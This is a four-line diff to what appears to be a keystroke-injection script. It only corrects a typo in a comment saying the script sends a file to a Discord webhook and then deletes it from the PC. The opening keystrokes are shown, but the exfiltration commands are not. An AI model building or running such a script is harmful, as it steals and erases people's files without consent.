@@ -1,4 +1,4 @@
-REM This script sends the file to your discord webook and deletes the file from the pc
+REM This script sends the file to your discord webhook and deletes the file from the pc
 DELAY 1000
 GUI r
 DELAY 1000
